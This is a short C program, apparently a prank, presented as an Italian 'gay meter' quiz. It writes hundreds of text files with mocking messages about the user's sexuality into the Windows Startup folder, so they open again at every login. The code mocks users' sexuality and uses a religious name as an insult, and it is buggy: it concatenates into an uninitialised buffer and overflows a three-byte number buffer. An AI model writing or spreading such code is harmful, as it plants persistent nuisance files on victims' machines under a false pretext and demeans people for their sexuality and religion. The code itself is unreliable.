#include<stdio.h>
#include <string.h>
#include<stdlib.h>

int main()
{
    char path1[]="C:/Users/";
    char path2[]="/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/pazzo";
    char path[300];
    char NameFile[300];
    char num[3];
    char ext[]=".txt";
    int i,GayMeter,Nsus;
    Nsus=0;
    i=0;
    GayMeter=3;

    strcat(path,path1);
    strcat(path,getenv("USERNAME"));
    strcat(path,path2);

    printf("Quanto gay ti reputi? (scala da 100 a 1000):");
    scanf("%d",&GayMeter);

    while(i<GayMeter){
        Nsus++;
        strcpy(NameFile,path);
        sprintf(num, "%d", Nsus);
        strcat(NameFile,num);
        strcat(NameFile,ext);
        FILE* allah=fopen(NameFile,"w");
        fprintf(allah,"Sei gay al %d Percento",Nsus);
        i++;
        fclose(allah);
    }
}
